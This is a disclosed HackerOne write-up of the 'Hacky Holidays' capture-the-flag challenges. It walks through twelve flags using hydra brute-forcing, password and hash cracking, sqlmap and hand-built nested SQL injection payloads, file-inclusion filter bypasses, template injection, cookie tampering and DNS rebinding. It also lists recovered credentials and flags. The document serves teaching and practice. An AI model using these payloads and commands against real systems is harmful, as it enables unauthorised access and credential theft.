# Wholesome Hacky Holidays: A Writeup

## Report Details
- **Report ID**: 1066135
- **URL**: https://hackerone.com/reports/1066135
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-25T05:06:59.032Z
- **Disclosed**: 2021-01-12T18:00:46.139Z

## Reporter
- **Username**: phibz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Flag 1 Warm-up: flag{48104912-28b0-494a-9995-a203d1e261e7}
Checking the `robots.txt` the flag can be found. Also a path is revealed: `/s3cr3t-ar3a`

## Flag 2 It's right in front of you: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
With the previously found path `/s3cr3t-ar3a`, the flag was hidden in plain sight. Opening the dev tools and searching for `flag` reveals it.

## Flag 3 People Rater: flag{b705fb11-fb55-442f-847f-0931be82ed9a}
On the front page a new button `Apps` appeared. One app, the `People Rater` is aviailable. At URL `https://hackyholidays.h1ctf.com/people-rater` we can use the Grinch People Rater by clicking one of the names. For example selecting `Tea Avery` pops an alertbox with `Awful`. Looking at the request in Burp:

Request:
```
GET /people-rater/entry?id=eyJpZCI6Mn0= HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: https://hackyholidays.h1ctf.com/people-rater
``` 

Response: 
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 03:47:29 GMT
Content-Type: application/json
Connection: close
Content-Length: 57

{"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
```

In the request, we see the parameter `id=eyJpZCI6Mn0=` which is an encoded base64 string. Decoding it reveals `{"id":2}`. Simply replacing the value with the base64 encoded variant of `{"id":2}`, which is `eyJpZCI6MX0=` leads to the following response:
```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 15 Dec 2020 03:51:22 GMT
Content-Type: application/json
Connection: close
Content-Length: 135

{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```
## Flag 4 Swag Shop: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
The objective of this challenge is to pull the Grinch's details from the online shop. We are presented with an online shop that has an API. We can fuzz the API and find the following two hidden endpoints:
```
/swag-shop/api/sessions
/swag-shop/api/user
```
The first endpoint reveals 7 different base64-encoded session tokens. One of the tokens is longer than the others. Decoding it reveals:
```
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}
```
Here, we have a Universal Unique Identifier (UUID) and a cookie. 
Taken a look at the `/swag-shop/api/user` endpoint results in:
```
error	"Missing required fields"
```
So here, we are searching for a parameter. By manual testing with the information that we already collected we can identify uuid as a parameter. Requesting `/swag-shop/api/user?uuid=1` responds with: 
```
error	"Could not find matching uuid"
```
Simply appending the UUID to the URI we found previously and accessing 
`https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043` we can pull the Grinch's details and a flag.
```	
uuid	"C7DCCE-0E0DAB-B20226-FC92EA-1B9043"
username	"grinch"
address	
line_1	"The Grinch"
line_2	"The Cave"
line_3	"Mount Crumpit"
line_4	"Whoville"
flag	"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
```

## Flag 5 Secure Login: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
The objective of this challenge is to find a way past the login page to get to the secret area. The challenge starts with a login page. Testing a random combination for the username and password field, an `Invalid Username` appears. This is an indicator, that we might be able to brute-force the username and password individually based on the error code. We first try to brute-force the username with: 
```
hydra -L ~/SecLists/Usernames/Names/names.txt -p pass hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Username"
```
We receive the username:`access`. Given the username, trying a random password leads to the error response `Invalid Password`. We can brute-force the password using: 
```
hydra -l access -P ~/wordlists/rockyou.txt hackyholidays.h1ctf.com https-post-form "/secure-login:username=^USER^&password=^PASS^:Invalid Password"
```
We receive the password: `computer`. Logging in with the brute-forced credentials we land at a page with secure files where are `No Files To Download`. Investigating the response in Burp, we can notice the Cookie:
```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D
```
Doing a base64-decoding on the cookie shows:
```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}7
```
We change the cookie to:
```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}
```
and encode it with base64 again:
```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```
With this we can see one file named `my_secure_files_not_for_you.zip`, which we can download locally (`wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip`). Trying to unzip the file, a password is requested. We can crack this with john the ripper.
```
zip2john my_secure_files_not_for_you.zip > my_secure_files_not_for_you.txt
john my_secure_files_not_for_you.txt
```
John the ripper cracks the password, which is `hahahaha`. With the password, we can unzip the archive and retrieve the flag.

## Flag 6 My Diary: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
The objective of this challenge is to hack the Grinch's diary to find out about his upcoming event. Starting the challenge, we can directly recognize the path `my-diary/?template=entries.html`. It seems that the `entries.html` is included through the `template` parameter. It might also be possible to include other pages then. Through a bit of manual testing for some common pages, we can find `/template=index.php`, which presents the respective php code. 
```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
Visiting the endpoint `secretadmin.php` we see the message `You cannot view this page from your IP Address`. After trying a few bypasses, it becomes clear that this seems to be a dead end. Taking a closer look at our previously found `index.php` we can see that the code does three things. 
 1. Special characters are eliminated
 2. The string `admin.php` is eliminated
 3. The string `secretadmin.php` is eliminated. 
To include `secretadmin.php` we need to bypass these restrictions. This can be achieved through the following parameter `ssecretaadmin.phpdmin.phpecretaadmin.phpdmin.php`. This will include the `secretadmin.php` file and we can retrieve the flag and see that the Grinch plans to `Launch DDoS Against Santa's Workshop!` on `23rd Dec`.

## Flag 7 Hate Mail Generator: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
In this challenge, we are asked to find the flag in the Grinch's hate mail generator. Clicking through the app, we find that the grinch uses templates:
```
{{template:cbdj3_grinch_header.html}} 
Hi {{name}}..... 
Guess what..... 
<strong>YOU SUCK!</strong>
{{template:cbdj3_grinch_footer.html}}
```
From here we can see that we can include `{{name}}` as well as two templates. It is also possible to create a new mail for testing. If we try to include a wrong path with `{{template:chron0x}}` we get the response `Cannot find template file /templates/chron0x`. Checking the path `/hate-mail-generator/templates/` we find that there exists another template: `38dhs_admins_only_header.html`. However, including it in the markup results in the message: `You do not have access to the file 38dhs_admins_only_header.html`. On the other side including it in the Subject or Name field does not lead to such an error. Previously we also have seen, that it is possible to include `{{name}}`. Investigating the request in Burp, we can see that `preview_data` is used as a body parameter. URL decoding the parameter results in:
```
{"name":"Alice","email":"alice@test.com"}
```
Here we can manipulate the name parameter to `{"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}` and URL-encode it again. Providing the manipulated `preview_data` body parameter with `{{name}}` in the markup field we can access the `Grinch Network Admins Only` area and find the flag. The manipulated body looks like this:
```
preview_markup=%7B%7Bname%7D%7D&preview_data=%7B%22name%22%3A%22%7B%7Btemplate%3A38dhs_admins_only_header.html%7D%7D%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

## Flag 8 Forum: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
The objective of this challenge is to access the admin space of the Grinch's forum. In the forum, we can identify the username `grinch` and `max`. Brute-forcing for passwords with these usernames does not give any result. A directory brute-force reveals the path `/forum/phpmyadmin`. Here, brute-forcing does also not lead to any further results. After further searches for Grinch-Networks on Google and Github, the source code of the forum could be discovered at `https://github.com/Grinch-Networks/forum`. Looking at the commits, the credentials for the phpmyadmin can be discovered in the ["Small fix" commit](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae). The credentials are `forum:6HgeAZ0qC9T6CQIqJpD`. Clicking through the pages we can discover MD5-hashed passwords for the grinch and max at `/forum/phpmyadmin?db=forum&table=user`. [Crackstation](https://crackstation.net/) can crack the password of the grinch. 
```
grinch  35D652126CA1706B59DB02C93E0C9FBF    md5     BahHumbug
max     388E015BC43980947FCE0E5DB16481D1    Unknown Not found.
```
Logging in with `grinch:BahHumbug` at `/forum/login` we can access the `Secret Plans` blogpost which further details the Grinch's DDoS attack plans as well as the flag.

## FLag 9 Evil Quiz: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
In this challenge, we are participating in a quiz by the grinch. After poking around at the page we notice that the `name` field/parameter is vulnerable to SQL injection. Injecting `' or (select sleep(15)); --` as the name and navigating to `/evil-quiz/score` puts the site to sleep for 15 seconds. From this, we know that we might deal here with a second-order time-based blind SQL injection. So lets fire up `sqlmap`:
```
sqlmap -u https://hackyholidays.h1ctf.com/evil-quiz --data "name=chron0x" -p "name" --method POST --second-url "https://hackyholidays.h1ctf.com/evil-quiz/score" --cookie="session=4e78bb0ffd17d4f1f67799a8d4165394" -D quiz --dump
```
Sqlmap finally reveals the credentials: `admin:S3creT_p4ssw0rd-$`. With these, we can log in to the admin panel (`/evil-quiz/admin`) and retrieve the flag.

## Flag 10 Signup Manager: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
At the beginning of the challenge, we are presented with a login forum. After an attempt to create an account we are stuck with the message `We'll have a look into you and see if you're evil enough to join the grinch army!` with only the option to log out. Inspecting the source of the login page, we can see a reference to `README.md` in a comment at the top. Navigating to `/signup-manager/README.md` automatically downloads the markdown file. The content is as follows:
```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```
We can notice the reference to `signupmanager.zip`. Navigating to `/signup-manager/signupmanager.zip` downloads a zip file containing the source code of the application. Of the source code, only the `index.php` file is relevant for this challenge. In a nutshell, the code takes the username, password, age, first name, and last name as inputs, substitutes special characters, checks that their length is below a certain length, and pads them if necessary. The inputs are concatenated with a random md5 hash in between. Most importantly, the code appends the character `N` at the end of the string, to flag this user as non-root. The `README.md`, as well as the source code, reveal that access to the admin page is granted when the character `Y` is appended instead. Hence, the objective is to inject a `Y` at the end of our string through the last name parameter. Therefore the string has to be extended.
Of special interest for this challenge is the handling of the age-parameter:
```php
[...]
if (!is_numeric($_POST["age"])) {
    $errors[] = 'Age entered is invalid';
}
if (strlen($_POST["age"]) > 3) {
    $errors[] = 'Age entered is too long';
}
[...]
```
In short, the age parameter has to be numeric and less than 3 characters. At first thought, this might only allow a maximum age of 999. However, php also allows the scientific notation with the `e` character. For example `1e4` will be translated to `10000`. As we can see `1ex` fulfills our conditions: It is numeric, fewer characters than 3, and will extend our string.
With this knowledge we can register a new user and change the payload as follows:
```
action=signup&username=pink&password=panther&age=1e3&firstname=pink&lastname=pantherYYYYYYYY
```
This will forward us to the admin area and present the flag.

## Flag 11 SQL Inception: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Apart from the flag, challenge 10 also presented a link: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59`, which is the starting point of this challenge. Be prepared for some brain toasting from here on. Browsing through the app we find that there are three albums which are requested via a hash, such as `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`. Each album requests several images, for example like `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9`. Decoding the data value with base64 reveals: 
```
{"image":"r3c0n_server_4fdk59\/uploads\/9b881af8b32ff07f6daada95ff70dc3a.jpg","auth":"e934f4407a9df9fd272cdb9c397f673f"}
```
Further, there is an endpoint `/r3c0n_server_4fdk59/api` which states 
```
+------------------+----------------------------------------------+
| HTTP Status Code |                 Explanation                  |
+------------------+----------------------------------------------+
| 200              | Successful request with data returned        |
| 204              | Successful request but with no data found    |
| 404              | Invalid Endpoint                             |
| 400              | Invalid GET/POST variable                    |
| 401              | Unauthenticated Request or Invalid client IP |
+------------------+----------------------------------------------+
```
After a bit of tinkering with the app, we find that the `hash` parameter in album is vulnerable against SQL injection. 
```
$ sqlmap -u https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k --dbs --dump

---
Parameter: hash (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: hash=jdh34k' AND 6610=6610 AND 'Fhnh'='Fhnh

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: hash=-2048' UNION ALL SELECT NULL,NULL,CONCAT(0x7178707a71,0x75596543734d797a5042444f5869494d5858675873624c52677a554a654f507072446f5078754469,0x7162627171)-- -
---
[11:09:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 8
[11:09:20] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] recon

Database: recon
Table: album
[3 entries]
+----+--------+-----------+
| id | hash   | name      |
+----+--------+-----------+
| 1  | 3dir42 | Xmas 2018 |
| 2  | 59grop | Xmas 2019 |
| 3  | jdh34k | Xmas 2020 |
+----+--------+-----------+

Database: recon
Table: photo
[6 entries]
+----+----------+--------------------------------------+
| id | album_id | photo                                |
+----+----------+--------------------------------------+
| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
+----+----------+--------------------------------------+
```
The requests to this database might look something like this: 
```SQL
select photo from album, photo where album.id = photo.album_id and hash = <input>
```
From the sqlmap output, we already know a payload: `chron0x' UNION ALL SELECT NULL,NULL,"chron0x"-- -`. This will print `chron0x` on a page. At that time a lot of people including me were stuck and in the forum, several hints regarding the movie "Inception" were dropped. It turned out that these referred to an SQL injection in the SQL injection. Following these hints and with a bit of tinkering, we can find another SQL injection in the SQL Injection.
```
chron0x' UNION ALL SELECT "chron0x' UNION ALL SELECT NULL,NULL,'chron0x_path'-- -",null,null -- -
```
Using this payload, the response to `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=hash=chron0x%27%20UNION%20ALL%20SELECT%20%22chron0x%27%20UNION%20ALL%20SELECT%20NULL,NULL,%27chron0x_path%27--%20-%22,null,null%20--%20-`, will try to fetch an image with the following: `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcL2Nocm9uMHhfcGF0aCIsImF1dGgiOiJmOTNjMzI5MjI5OTU0ZWQzOWRmYTRhMzkwMTNmNjljNSJ9`. Decoding the base64 payload, we can see that `chron0x_path` is reflected 
```
{"image":"r3c0n_server_4fdk59\/uploads\/chron0x_path","auth":"f93c329229954ed39dfa4a39013f69c5"}
```
The response of the request to fetch this image is `Expected HTTP status 200, Received: 404`. Now that we found the inception SQLi, lets write a small script to explore what we just did manually a bit more.
```
#!/bin/bash

URL="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/"

BASE64=$(curl -s $URL"album?hash=chron0x' UNION ALL SELECT \"chron0x' UNION ALL SELECT NULL,NULL,'$1'-- -\",null,null -- -" \
        | grep "img-responsive" \
        | grep -o "data\=.*" \
        | sed "s/^data\=//g" \
        | sed "s/\">//g")

RESP=$(curl -s $URL"picture?data="$BASE64)

echo $1 $RESP
```
The script will always respond with our input parameter and the response with respect to the picture query. Through either brute-forcing or some educated guesses we can find the following interesting responses.
```
chron0x Expected HTTP status 200, Received: 404
../api Invalid content type detected
../api/user Invalid content type detected
```
Note you can use the above script for brute-forcing by just queying it with each line of the wordlist and grepping for the reponses. Now we know that the user endpoint exists. The next step would be to query some user information. Through an educated guess or brute-forcing we can again find a valid parameter.
```
../api/user?name=chron0x Expected HTTP status 200, Received: 400
../api/user?username=chron0x Expected HTTP status 200, Received: 204
```
As we have seen from the previous table, response `204` means `Successful request but with no data found`. This means we found the `username` parameter. The next step would be to find a valid username. First, let's see if any character can give us a different response. Iterating through all ASCII characters we find:
```
../api/user?username=a Expected HTTP status 200, Received: 204
../api/user?username=b Expected HTTP status 200, Received: 204
../api/user?username=% Invalid content type detected
```
In hope that the `%` character behaves as a wildcard, we can try if we can brute-force the first character of a username. Indeed, we can the following username:
```
../api/user?username=g% Invalid content type detected
../api/user?username=gr% Invalid content type detected
../api/user?username=gri% Invalid content type detected
../api/user?username=grin% Invalid content type detected
../api/user?username=grinc% Invalid content type detected
../api/user?username=grinch% Invalid content type detected
../api/user?username=grincha% Invalid content type detected
../api/user?username=grinchad% Invalid content type detected
../api/user?username=grinchadm% Invalid content type detected
../api/user?username=grinchadmi% Invalid content type detected
../api/user?username=grinchadmin% Invalid content type detected
../api/user?username=grinchadmin Invalid content type detected
```
`grinchadmin` it is. Well, we already found a method to brute-force the username. Let's try if we can apply the same approach for a password. However, at this step, we have to be cautious, since we do not know how to connect the two parameters.
```
../api/user?username=grinchadmin&test=chron0x Invalid data format
../api/user?username=grinchadmin%26test=chron0x Expected HTTP status 200, Received: 400
```
As we can see, we should use the URL-encoded variant. Again through either an educated guess or through brute-force, we can find the password parameter.
```
../api/user?username=grinchadmin%26pass=chron0x Expected HTTP status 200, Received: 400
../api/user?username=grinchadmin%26password=chron0x Expected HTTP status 200, Received: 204
```
With the same procedure as before, we can brute-force the password.
```
../api/user?username=grinchadmin%26password=% Invalid content type detected
../api/user?username=grinchadmin%26password=s% Invalid content type detected
../api/user?username=grinchadmin%26password=s4% Invalid content type detected
../api/user?username=grinchadmin%26password=s4n% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4s% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4su% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4suc% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4suck% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4sucks% Invalid content type detected
../api/user?username=grinchadmin%26password=s4nt4sucks Invalid content type detected
```
We successfully brute-forced the credentials: `grinchadmin:s4nt4sucks`. To get the flag and to the next challenge, we can use the credentials to log in into the attack-box (`/attack-box`).

# Flag 12 Attack Box: flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
At this stage, we are logged into the Grinch's attack server. From here we can start a DDOS attack at three of Santas' servers. The objective of this challenge is to reroute this DDOS attack toward the Grinch's server, in other words to localhost. Launching an attack against any of the servers, the following request is send: `/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`. Decoding the base64 reveals: `{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}`. For all three servers, this results in:
```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
{"target":"203.0.113.53","hash":"2814f9c7311a82f1b822585039f62607"}
{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
```
The `hash` parameter appears to be an MD5-hash. Tinkering with either the `target` or `hash` parameter results in the response: `Invalid Protection Hash`. This tells us that some sort of validation of the target and hash parameter is performed. Since the target does not directly translate to the hash, we can guess that it is a salted hash. We can try to crack the hash with hashcat. Therefore, we store our information in the form `$pass:$salt` into a file called `hash.txt`:
```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```
Now we can proceed to try to crack the hashes with 
```
hashcat -m10 -O -o hash.out hash.txt /usr/share/wordlists/rockyou.txt
```
Here `-m10` stands for our selected format, as to how we stored the hashes in our file. After executing this we can view the outputs in the file `hash.out`:
```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```
We successfully cracked the hashes and are now able to generate our payloads. As a quick sanity check we can confirm that the MD5 of `mrgrinch463203.0.113.33` is indeed `5f2940d65ca4140cc18d0878bc398955`. So lets redirect the attack against `127.0.0.1` with the following payload `{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}`, with `3e3f8df1658372edf0214e202acb460b` being the MD5 for `mrgrinch463127.0.0.1`. Launching the attack with `/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==` and visiting `https://hackyholidays.h1ctf.com/attack-box/launch/5867c35a78d569fea1d4ac81ae55e2e1`, we can see that:`Local target detected, aborting attack`. This means there is a detection in place, such that we do not attack ourselves. It would be great if we first could pretend that we are the target IP and then switch to the localhost. We can achieve exactly this with a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding). I used the following [service](https://lock.cmpxchg8b.com/rebinder.html). What it does is: "The hostname generated will resolve randomly to one of the addresses specified with a very low time to live record." We insert our two IP addresses of choice `203.0.113.33` and `127.0.0.1` we receive the following address: `cb007121.7f000001.rbndr.us`. With `dig A cb007121.7f000001.rbndr.us` we can confirm that the address indeed resolves to any of the two domains randomly:
```
cb007121.7f000001.rbndr.us. 1	IN	A	203.0.113.33
cb007121.7f000001.rbndr.us. 1	IN	A	127.0.0.1
```
Again we can construct a new payload and base64 encode it: 
```
{"target":"cb007121.7f000001.rbndr.us","hash":"aa9c061c933f709acb4d69329bc7b1af"}
eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9
```
With the following path we can launch our attack: `/attack-box/launch?payload=eyJ0YXJnZXQiOiJjYjAwNzEyMS43ZjAwMDAwMS5yYm5kci51cyIsImhhc2giOiJhYTljMDYxYzkzM2Y3MDlhY2I0ZDY5MzI5YmM3YjFhZiJ9`. The attack might not be successful on the first try, but after a few attempts the DNS rebinding attack is successful and we are knocking off the Grinch's server, and getting reconnected to `https://hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709` were we are presented with the final flag.

## Impact

Positive impact on my life.

## Attachments
No attachments
